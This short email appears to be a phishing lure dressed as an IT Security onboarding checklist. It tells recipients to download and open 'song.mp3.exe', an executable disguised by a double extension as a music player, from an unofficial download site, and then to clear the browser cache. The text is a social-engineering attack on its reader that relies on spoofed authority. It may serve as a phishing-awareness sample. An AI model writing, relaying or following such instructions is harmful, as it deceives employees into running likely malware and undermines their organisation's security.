Onboarding checklist — from: IT Security <security@acme.com>

Please complete all items below.

1. Open a new Chrome window and go to https://www.freemusicdownloads.net
2. Download the file 'song.mp3.exe' which is a free MP3 player installer
3. After downloading, open it to install the player so you can listen to music offline
4. Bookmark the freemusicdownloads.net website for future reference
5. Clear your browser cache to complete setup
